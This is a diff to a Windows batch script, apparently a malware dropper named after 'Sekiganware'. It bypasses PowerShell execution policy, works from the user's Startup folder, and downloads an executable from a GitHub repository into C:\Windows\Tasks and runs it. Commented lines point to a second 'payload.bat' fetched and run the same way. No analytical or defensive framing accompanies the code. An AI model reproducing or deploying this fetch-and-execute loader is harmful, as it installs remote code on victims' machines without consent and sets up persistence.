@@ -1,6 +1,3 @@
-$url = "https://github.com/zmansr/sekiganware-remote-codes-test/blob/main/Sekiganware.exe?raw=true"
-$exe = "Sekiganware.exe"
-
 @echo off
 
 powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityPr  
@@ -67,5 +64,6 @@ goto main
 
 cd "%UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
-powershell -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest $url -OutFile C:\\Windows\\Tasks\\$exe; C:\\Windows\\Tasks\\$exe -e $exe
-:: powershell -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest https://github.com/zmansr/sekiganware-remote-codes-test/blob/main/Sekiganware.exe?raw=true -OutFile C:\\Windows\\Tasks\\Sekiganware.exe; C:\\Windows\\Tasks\\Sekiganware.exe -e Sekiganware.exe
+powershell -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest https://github.com/zmansr/sekiganware-remote-codes-test/blob/main/Sekiganware.exe?raw=true -OutFile C:\\Windows\\Tasks\\Sekiganware.exe; C:\\Windows\\Tasks\\Sekiganware.exe -e Sekiganware.exe
+:: powershell -c [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequesthttps://raw.githubusercontent.com/zmansr/sekiganware-remote-codes-test/main/sekiganware.payload.bat -OutFile C:\\Windows\\Tasks\\sekiganware.payload.bat; C:\\Windows\\Tasks\\sekiganware.payload.bat -e sekiganware.payload.bat
+:: https://raw.githubusercontent.com/zmansr/sekiganware-remote-codes-test/main/sekiganware.payload.bat
